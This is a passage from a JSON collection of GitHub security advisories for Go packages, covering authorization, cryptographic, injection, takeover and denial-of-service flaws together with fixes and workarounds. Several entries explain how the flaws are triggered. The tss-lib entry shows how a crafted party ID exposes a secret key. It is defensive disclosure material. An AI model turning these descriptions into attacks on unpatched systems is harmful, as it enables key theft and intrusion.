"https://pkg.go.dev/vuln/GO-2022-0300"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-01-24T22:42:15Z", "nvd_published_at": "2022-01-21T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7p8f-8hjm-wm92", "modified": "2022-01-13T15:02:31Z", "published": "2022-01-13T15:05:41Z", "aliases": ["CVE-2022-21646"], "summary": "Lookup operations do not take into account wildcards in SpiceDB", "details": "### Impact\nAny user making use of a wildcard relationship under the right hand branch of an `exclusion` or within an `intersection` operation will see `Lookup`/`LookupResources` return a resource as \"accessible\" if it is *not* accessible by virtue of the inclusion of the wildcard in the intersection or the right side of the exclusion.\n\nFor example, given schema:\n\n```zed\ndefinition user {}\n\ndefinition resource {\n   relation viewer: user\n   relation banned: user | user:*\n   permission view = viewer - banned\n}\n```\n\nIf `user:*` is placed into the `banned` relation for a particular resource, `view` should return false for *all* resources. in `v1.3.0`, the wildcard is ignored entirely in lookup's dispatch, resulting in the `banned` wildcard being ignored in the exclusion.\n\n### Workarounds\nDon't make use of wildcards on the right side of intersections or within exclusions. \n\n### References\nhttps://github.com/authzed/spicedb/issues/358\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [SpiceDB](https://github.com/authzed/spicedb)\n* Ask a question in the [SpiceDB Discord](https://authzed.com/discord)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/authzed/spicedb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.4.0"}]}], "versions": ["1.3.0"]}], "references": [{"type": "WEB", "url": "https://github.com/authzed/spicedb/security/advisories/GHSA-7p8f-8hjm-wm92"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-21646"}, {"type": "WEB", "url": "https://github.com/authzed/spicedb/issues/358"}, {"type": "WEB", "url": "https://github.com/authzed/spicedb/commit/15bba2e2d2a4bda336a37a7fe8ef8a35028cd970"}, {"type": "PACKAGE", "url": "https://github.com/authzed/spicedb"}, {"type": "WEB", "url": "https://github.com/authzed/spicedb/releases/tag/v1.4.0"}], "database_specific": {"cwe_ids": ["CWE-155", "CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-01-11T21:06:45Z", "nvd_published_at": "2022-01-11T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gp6j-vx54-5pmf", "modified": "2022-01-04T22:41:52Z", "published": "2022-01-06T18:30:26Z", "aliases": [], "summary": "Incorrect validation of parties IDs leaks secret keys in Secret-sharing scheme", "details": "# Summary\n\nIn the threshold signature scheme, participants start by dividing secrets into shares using a secret sharing scheme. The Verifiable Secret Sharing scheme generates shares from the user\u2019s IDs but does not properly validate them. Using a malicious ID will make other users reveal their secrets during the secret-sharing procedure. In addition, a second issue resulting from lack of validation could cause nodes to crash when sent maliciously formed user IDs.\n\n# Details\n\nThe creation of Parties IDs does not properly validate for maliciously chosen IDs. Parties generate the secret shares in `binance-chain/tss-lib` codebase that `keep-network/keep-ecdsa` uses by evaluating the polynomial with the other parties\u2019 IDs. It is critical that these party ids are non-zero because evaluating the polynomial at point 0 reveals the secret.\n\nThere is a check that these ids are not zero, but this is insufficient since it is not performed modulo the curve order. Therefore, one can set their ID equal to the order of the elliptic curve, which equals 0 during the polynomial evaluation modulo the curve order.\n```\n    shares := make(Shares, num)\n    for i := 0; i < num; i++ {\n        if indexes[i].Cmp(big.NewInt(0)) == 0 {\n            return nil, nil, fmt.Errorf(\"party index should not be 0\")\n        }\n        share := evaluatePolynomial(ec, threshold, poly, indexes[i])\n        shares[i] = &Share{Threshold: threshold, ID: indexes[i], Share: share}\n    }\n```\n(https://github.com/binance-chain/tss-lib/blob/73560daec7f83d7355107ea9b5e59d16de8765be/crypto/vss/feldman_vss.go#L64-L70)\n\nThus, a party with an ID equal to the order of the curve will receive the secret key as its share.\n\nAnother issue with the tss-lib implementation was the lack of verification for modularly equal user IDs that can cause nodes to crash during key generation or resharing.\n\n# Timeline\n\n### 6 December 2021, 20:28 CET\nThe team is informed by Trail of Bits about the issue in `binance-chain/tss-lib`. The vulnerability was already disclosed with Binance and they have implemented fixes in their recent commits. We are advised to update our dependency to the most recent `binance-chain/tss-lib` version.\n\n### 7 December 2021, 9:10 CET\nThe team confirms with Trail of Bits we started the work on a fix.\n\n### 7 December 2021, 20:03 CET\nThe team informs Trail of Bits that we found a potential problem in Binance's fix that may lead to the signing code failing with Go panic. We identified the problematic line and suggested its removal.\n\nTo address the vulnerability in the protocol, it is required to ensure that:\n- all indexes are non-zero,\n- all indexes are non-zero modulo the curve order,\n- all indexes are unique modulo the curve order.\n\nThe first two are guarded in `CheckIndexes` function by:\n```\nvMod := new(big.Int).Mod(v, ec.Params().N)\nif vMod.Cmp(zero) == 0 {\n  return nil, errors.New(\"party index should not be 0\")\n}\n```\nThe last one is guarded by:\n```\nif sortutil.Dedupe(sortutil.BigIntSlice(dup)) < len(indexes) {\n  return nil, errors.New(\"duplicate in indexes\")\n}\n```\nHowever, `CheckIndexes` was additionally modified to update values of passed indexes by doing `indexes[i] = vMod`.\n\nThis line was not backward-compatible and caused signatures to fail with `panic: runtime error: invalid memory address or nil pointer dereference` in case the signing group was generated with at least one `PartyID.Key` higher than `ec.Params().N`. This would also be problematic for new code that constructs such `PartyID` - we tested that key generation completed successfully but signing failed with the mentioned panic.\n\n### 8 December 2021, 12:49 CET\nTrail of Bits confirmed the line we flagged is not critical to the security of the protocol.\n\n### 8 December 2021, 15:29 CET\nThe team informed Trail of Bits we are planning to open a PR to `binance-chain/tss-lib` with a fix and we suggest extending the embargo for communicating this issue for one more week, until Friday, Dec 17h to give everyone more time update their code given the problem was found. We also ask Trail of Bits to get in touch with Binance to review our fix given that we are not going to provide a sufficient explanation in the commit and PR description to do not threaten the security of projects that have already upgraded their dependency.\n\n### 8 December 2021, 18:17 CET\n\nThe team informs Trail of Bits about opening a PR https://github.com/binance-chain/tss-lib/pull/155 and explains all the details of the issue.\n\nThe problematic scenario is:\n\n1. We start the keygen by creating `PartyID` for each member. The `PartyID` struct has `Id` and `Key` fields. We set `PartyID.Key` that is higher than the elliptic curve's `N`.\n2. This goes to tss-lib which starts the round 1 code (`ecdsa/keygen/round_1.go`). It takes `PartyID.Key` of each member and assembles the `ids` slice. This slice is thrown into `CheckIndexes` which overwrites each element by doing the modulo `N`.\n3. After returning from `CheckIndexes` the modified `ids` slice is used to set the `Ks` slice in the final `LocalPartySaveData` which is received by each group member as keygen final result.\n4. Each member takes this `LocalPartySaveData` and saves it on disk.\n5. Upon signing, we do the same as in point 1, so we construct `PartyID`s in the same way and start the protocol. At this point, `PartyID.Key` is higher than curve's `N`.\n6. Before starting round 1 of signing, `LocalPartySaveData` obtained at keygen and our `PartyID`s built at point 5 are used in `BuildLocalSaveDataSubset` to build a new `LocalPartySaveData` instance.\n7. `BuildLocalSaveDataSubset` is the place where things go wrong because `Key` field of each `PartyID` from point 5 doesn't correspond to encoded `Ks` elements of `LocalPartySaveData` obtained after keygen, the final `LocalPartySaveData` is corrupted, and cause panic upon validation before signing round 1.\n\n### 8 December 2021, 21:50 CET\n\nTrail of Bits confirms they are going to followup with Binance and they agree to extend the embargo by a week.\n\n### 8 December 2021, 15:16 CET\n\nTrail of Bits validates the problematic scenario we described and our fix. Trail of Bits reaches to Binance and recommends merging our fix and in addition to some other fixes that would secure the code to do not panic even if `LocalPartySaveData` has corrupted data.\n\n### 10 December 2021, 8:16 CET\n\nBinance merges our fix https://github.com/binance-chain/tss-lib/commit/cd95cee01ea2af6d4aa8316612803be944d5369a\n\n### 13 December 2021, 8:35 CET\n\nBinance applies more fixes so that even in case of `LocalPartySaveData` corrupted, the code is not going to panic.\n\n### 15 December 2021\n\nThe team releases a new version of the client, v1.8.1, and announces the need for an upgrade.\nhttps://github.com/keep-network/keep-ecdsa/releases/tag/v1.8.1", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/keep-network/keep-ecdsa"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/keep-network/keep-ecdsa/security/advisories/GHSA-gp6j-vx54-5pmf"}, {"type": "PACKAGE", "url": "https://github.com/keep-network/keep-ecdsa"}, {"type": "WEB", "url": "https://github.com/keep-network/keep-ecdsa/releases/tag/v1.8.1"}], "database_specific": {"cwe_ids": [], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-01-04T22:41:52Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-f9jg-8p32-2f55", "modified": "2023-10-02T15:53:13Z", "published": "2022-01-08T00:00:21Z", "aliases": ["CVE-2021-25743"], "summary": "kubectl ANSI escape characters not filtered", "details": "kubectl (k8s.io/kubernetes/pkg/kubectl) does not neutralize escape, meta or control sequences contained in the raw data it outputs to a terminal. This includes but is not limited to the unstructured string fields in objects such as Events.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.26.0-alpha.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25743"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/101695"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/112553"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/dad0e937c0f76344363eb691b2668490ffef8537"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220217-0003/"}], "database_specific": {"cwe_ids": ["CWE-150"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-09-07T23:58:59Z", "nvd_published_at": "2022-01-07T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5r5w-h76p-m726", "modified": "2022-01-13T18:32:43Z", "published": "2022-01-06T22:20:53Z", "aliases": ["CVE-2021-42583"], "summary": "Use of a Broken or Risky Cryptographic Algorithm in Max Mazurov Maddy", "details": "A Broken or Risky Cryptographic Algorithm exists in Max Mazurov Maddy before 0.5.2, which is an unnecessary risk that may result in the exposure of sensitive information.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/foxcpp/maddy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-42583"}, {"type": "PACKAGE", "url": "https://github.com/foxcpp/maddy"}, {"type": "WEB", "url": "https://github.com/foxcpp/maddy/blob/df40dce1284cd0fd0a9e8e7894029553d653d0a5/internal/auth/shadow/verify.go"}, {"type": "WEB", "url": "https://github.com/foxcpp/maddy/releases/tag/v0.5.2"}], "database_specific": {"cwe_ids": ["CWE-327"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-01-06T18:56:46Z", "nvd_published_at": "2021-12-28T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pmcr-2rhp-36hr", "modified": "2022-01-25T21:03:46Z", "published": "2022-01-27T16:23:02Z", "aliases": ["CVE-2022-23857"], "summary": "SQL injection in github.com/navidrome/navidrome", "details": "model/criteria/criteria.go in Navidrome before 0.47.5 is vulnerable to SQL injection attacks when processing crafted Smart Playlists. An authenticated user could abuse this to extract arbitrary data from the database, including the user table (which contains sensitive information such as the users' encrypted passwords).", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/navidrome/navidrome"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.47.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23857"}, {"type": "WEB", "url": "https://github.com/navidrome/navidrome/commit/9e79b5cbf2a48c1e4344df00fea4ed3844ea965d"}, {"type": "PACKAGE", "url": "https://github.com/navidrome/navidrome"}, {"type": "WEB", "url": "https://github.com/navidrome/navidrome/releases/tag/v0.47.5"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-01-25T21:03:46Z", "nvd_published_at": "2022-01-24T02:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m36x-mgfh-8g78", "modified": "2023-07-07T16:28:46Z", "published": "2022-01-27T15:15:25Z", "aliases": ["CVE-2023-36474"], "summary": "Subdomain Takeover in Interactsh server", "details": "A domain configured with interactsh server was vulnerable to subdomain takeover for specfic subdomain, i.e `app`, Interactsh server before `< 1.0.0` used to create cname entries for `app` pointing to `projectdiscovery.github.io` as default which intended to used for hosting interactsh [web client](https://github.com/projectdiscovery/interactsh-web) using GitHub pages. It turns out to be a security issue with a self-hosted interactsh server in which the user may not have configured a web client but still have a cname entry pointing to GitHub pages, making them vulnerable to subdomain takeover.\n\nThis issue was initially reported to us as a subdomain takeover for one of our domains that runs interactsh server by **Melih** at `security@projectdiscovery.io`, and after conducting an internal investigation, we determined that it was an issue with the default config of interactsh server affecting all the server running self-hosted instance of interactsh, as a result - cname entry has been removed in the latest release.\n\n#### Impact\nThis allows one to host / run arbitrary client side code (XSS) in a user's browser when browsing the vulnerable subdomain, for more details on the impact, please read this [detailed blogpost](https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/) from Detectify.\n#### Patches\nUpdate to [Interactsh server v1.0.0 ](https://github.com/projectdiscovery/interactsh/releases/tag/v1.0.0)with `go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest`\n\n#### References\nhttps://github.com/projectdiscovery/interactsh/issues/136\n\n#### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@projectdiscovery.io](mailto:security@projectdiscovery.io)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/projectdiscovery/interactsh"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/projectdiscovery/interactsh/security/advisories/GHSA-m36x-mgfh-8g78"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-36474"}, {"type": "WEB", "url": "https://github.com/projectdiscovery/interactsh/issues/136"}, {"type": "WEB", "url": "https://github.com/projectdiscovery/interactsh/pull/155"}, {"type": "PACKAGE", "url": "https://github.com/projectdiscovery/interactsh"}, {"type": "WEB", "url": "https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-01-24T22:24:55Z", "nvd_published_at": "2023-06-28T22:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f854-hpxv-cw9r", "modified": "2022-01-06T20:21:28Z", "published": "2022-01-06T18:30:54Z", "aliases": ["CVE-2021-43839"], "summary": "Drainage of FeeCollector's Block Transaction Fees in cronos", "details": "### Impact\nIn Cronos nodes running versions before v0.6.5, it is possible to take transaction fees from Cosmos SDK's FeeCollector for the current block by sending a custom crafted MsgEthereumTx.\n\nUser funds and balances are safe.\n\n\n### Patches\nThis problem has been patched in Cronos v0.6.5 on the mempool level.\nThe next network upgrade with consensus-breaking changes will patch it on the consensus level.\n\n### Workarounds\nThere are no tested workarounds. All validator node operators are recommended to upgrade to Cronos v0.6.5 at their earliest possible convenience.\n\n### Credits\nThank you to @zb3 for reporting this issue on [Cronos Immunefi Bug Bounty Program](https://immunefi.com/bounty/cronos/), to @cyril-crypto for reproducing the issue and to @yihuang and @thomas-nguy for patching the issue on the CheckTx (mempool) and the DeliverTx (consensus) levels.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a discussion in [crypto-org-chain/cronos](https://github.com/crypto-org-chain/cronos/discussions/new)\n* Email us at [chain@crypto.org](mailto:chain@crypto.org)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/crypto-org-chain/cronos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/tharsis/ethermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.8.0"}, {"fixed": "0.10.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/tharsis/evmos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.4.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/tharsis/ethermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/crypto-org-chain/cronos/security/advisories/GHSA-f854-hpxv-cw9r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-43839"}, {"type": "WEB", "url": "https://github.com/crypto-org-chain/cronos/pull/270"}, {"type": "WEB", "url": "https://github.com/crypto-org-chain/cronos/commit/150ef237b37ac28c8136e1c0f494932860b9ebe8"}, {"type": "PACKAGE", "url": "https://github.com/crypto-org-chain/cronos/"}], "database_specific": {"cwe_ids": ["CWE-670"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-01-04T22:40:01Z", "nvd_published_at": "2021-12-21T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m7vp-hqwv-7m5x", "modified": "2022-01-11T16:45:39Z", "published": "2022-01-12T22:33:04Z", "aliases": [], "summary": "Unbounded memory usage on exposed HTTP/2 (non-gRPC) endpoints", "details": "### Impact\nThe net/http Go package has a reported vulnerability tracked under CVE-2021-44716 which allows attacker controlled HTTP/2 requests to trigger unbounded memory usage in HTTP/2 endpoints. gRPC endpoints are not vulnerable as they rely on their own HTTP/2 implementation instead of the net/http package. HTTP/2 endpoints consuming the net/http package within SPIRE server and agent (or other components in this repository) that are _on by default_ include the following:\n- OIDC Discovery Provider\n- K8s Workload Registrar in webhook mode\n\nThe following endpoints are vulnerable _when enabled_:\n- SPIRE server bundle endpoint (i.e. Federation API)\n\nThe following endpoints are _NOT_ vulnerable, since HTTP/2 support in go is not enabled on non-TLS protected endpoints:\n- SPIRE server/agent metrics endpoint when configured for Prometheus\n- SPIRE server/agent health endpoints\n- SPIRE server/agent profiling endpoints\n\n### Patches\nSPIRE 1.0.3 and 1.1.3 have been released with an upgraded Go toolchain which patches the vulnerability\n\n### Workarounds\nThe vulnerability can be worked around entirely by including the `http2server=0` value in the `GODEBUG` environment variable (see https://github.com/golang/go/issues/50058). This turns off HTTP/2 support on all non-gRPC endpoints. They will still function with HTTP/1.1.\n\nThe risk associated with this vulnerability can be somewhat mitigated by limiting the exposure of the endpoints in question. If necessary, vulnerable components or endpoints that are optionally configured can be disabled temporarily.\n\n### References\n- https://github.com/golang/go/issues/50058\n- https://go-review.googlesource.com/c/go/+/370574/\n- https://nvd.nist.gov/vuln/detail/CVE-2021-44716\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/spiffe/spire"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/spiffe/spire"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.1.0"}, {"fixed": "1.1.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/spiffe/spire/security/advisories/GHSA-m7vp-hqwv-7m5x"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-01-10T22:07:35Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-r34v-gqmw-qvgj", "modified": "2023-09-26T16:55:36Z", "published": "2022-05-24T16:59:58Z", "aliases": ["CVE-2019-18466"], "summary": "Podman Symlink Vulnerability", "details": "An issue was discovered in Podman in libpod before 1.6.0. It resolves a symlink in the host context during a copy operation from the container to the host, because an undesired glob operation occurs. An attacker could create a container image containing particular symlinks that, when copied by a victim user to the host filesystem, may overwrite existing files with others from the host.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-18466"}, {"type": "WEB", "url": "https://github.com/containers/libpod/issues/3829"}, {"type": "WEB", "url": "https://github.com/containers/libpod/commit/5c09c4d2947a759724f9d5aef6bac04317e03f7e"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4269"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1744588"}, {"type": "PACKAGE", "url": "https://github.com/containers/libpod"}, {"type": "WEB", "url": "https://github.com/containers/libpod/compare/v1.5.1...v1.6.0"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-18T20:43:20Z", "nvd_published_at": "2019-10-28T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mjqc-5c9x-xfcc", "modified": "2022-06-08T22:35:32Z", "published": "2022-05-18T00:00:34Z", "withdrawn": "2022-06-08T22:35:32Z", "aliases": [], "summary": "Duplicate advisory: Configuration exposure in github.com/coreos/ignition", "details": "## Duplicate Advisory\nThis advisory is a duplicate of [GHSA-hj57-j5cw-2mwp](https://github.com/advisories/GHSA-hj57-j5cw-2mwp). This link is preserved to maintain external references.\n\n## Original Description\nA vulnerability was found in Ignition where ignition configs are accessible from unprivileged containers in VMs running on VMware products. This issue is only relevant in user environments where the Ignition config contains secrets. The highest threat from this vulnerability is to data confidentiality. Possible workaround is to not put secrets in the Ignition config.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/coreos/ignition/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.14.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1706"}, {"type": "WEB", "url": "https://github.com/coreos/ignition/issues/1300"}, {"type": "WEB", "url": "https://github.com/coreos/ignition/issues/1315"}, {"type": "WEB", "url": "https://github.com/coreos/ignition/pull/1350"}, {"type": "WEB", "url": "https://github.com/coreos/ignition/commit/4b70b44b430ecf8377a276e89b5acd3a6957d4ea"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2082274"}, {"type": "PACKAGE", "url": "https://github.com/coreos/ignition/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LY7LKGMQMXV6DGD263YQHNSLOJJ5VLV5/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NP765L7TJI7CD4XVOHUWZVRYRH3FYBOR/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/T5QQXRGQKTN4YX2ZF3GQNEBDEOKJGCN3/"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-25T19:37:07Z", "nvd_published_at": "2022-05-17T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c9gm-7rfj-8w5h", "modified": "2022-06-06T21:20:02Z", "published": "2022-05-25T00:00:38Z", "aliases": ["CVE-2021-42248"], "summary": "ReDoS via crafted JSON input in GJSON", "details": "GJSON <= 1.9.2 allows attackers to cause a redos via crafted JSON input.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tidwall/gjson"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-42248"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/issues/236"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/issues/237"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/commit/590010fdac311cc8990ef5c97448d4fec8f29944"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/commit/77a57fda87dca6d0d7d4627d512a630f89a91c96"}, {"type": "PACKAGE", "url": "https://github.com/tidwall/gjson"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0265"}], "database_specific": {"cwe_ids": ["CWE-1333"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-06T21:20:02Z", "nvd_published_at": "2022-05-24T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mj73-5x75-9phh", "modified": "2023-09-26T20:03:52Z", "published": "2022-05-24T17:04:02Z", "aliases": ["CVE-2019-19724"], "summary": "Singularity insecure permissions", "details": "Insecure permissions (777) are set on `$HOME/.singularity` when it is newly created by Singularity (version from 3.3.0 to 3.5.1), which could lead to an information leak, and malicious redirection of operations performed against Sylabs cloud services.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.3.0"}, {"fixed": "3.5.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 3.5.1"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-19724"}, {"type": "WEB", "url": "https://github.com/sylabs/singularity/commit/2cda4981812c29f0fb11d3ea6aaf6139f665a631"}, {"type": "PACKAGE", "url": "https://github.com/sylabs/singularity"}, {"type": "WEB", "url": "https://github.com/sylabs/singularity/releases/tag/v3.5.2"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-01/msg00025.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00059.html"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-18T21:02:11Z", "nvd_published_at": "2019-12-18T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vvmq-fwmg-2gjc", "modified": "2022-05-26T20:07:54Z", "published": "2022-05-16T18:13:51Z", "aliases": ["CVE-2022-24817"], "summary": "Improper kubeconfig validation allows arbitrary code execution", "details": "Flux2 can reconcile the state of a remote cluster when provided with a [kubeconfig](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/#file-references) with the correct access rights. `Kubeconfig` files can define [commands](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#client-go-credential-plugins) to be executed to generate on-demand authentication tokens. A malicious user with write access to a Flux source or direct access to the target cluster, could craft a `kubeconfig` to execute arbitrary code inside the controller\u2019s container.\n\nIn multi-tenancy deployments this can also lead to privilege escalation if the controller's service account has elevated permissions.\n\n### Impact\n\nWithin the affected versions range, one of the permissions set below would be required for the vulnerability to be exploited:\n- Direct access to the cluster to create Flux `Kustomization` or `HelmRelease` objects and Kubernetes Secrets.\n- Direct access to the cluster to modify existing Kubernetes secrets being used as `kubeconfig` in existing Flux `Kustomization` or `HelmRelease` objects.\n- Direct access to the cluster to modify existing Flux `Kustomization` or `HelmRelease` objects and access to create or modify existing Kubernetes secrets.\n- Access rights to make changes to a configured Flux Source (i.e. Git repository).\n\n### Patches\n\nThis vulnerability was fixed in kustomize-controller [v0.23.0](https://github.com/fluxcd/kustomize-controller/releases/tag/v0.23.0) and helm-controller [v0.19.0](https://github.com/fluxcd/helm-controller/releases/tag/v0.19.0), both included in flux2 [v0.29.0](https://github.com/fluxcd/flux2/releases/tag/v0.29.0). Starting from the fixed versions, both controllers disable the use of command execution from `kubeconfig` files by default, users have to opt-in by adding the flag `--insecure-kubeconfig-exec` to the controller\u2019s command arguments. Users are no longer allowed to refer to files in the controller\u2019s filesystem in the `kubeconfig` files provided for the remote apply feature.\n\n### Workarounds\n\n- The functionality can be disabled via Validating Admission webhooks (e.g. OPA Gatekeeper, Kyverno) by restricting users from being able to set the `spec.kubeConfig` field in Flux `Kustomization` and `HelmRelease` objects.\n- Applying restrictive AppArmor and SELinux profiles on the controller\u2019s pod to limit what binaries can be executed.\n\n### Credits\n\nThe Flux engineering team found and patched this vulnerability.\n\n### For more information\n\nIf you have any questions or comments about this advisory please open an issue in the [flux2 repository](http://github.com/fluxcd/flux2).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fluxcd/flux2"}, "ranges": [{"type": 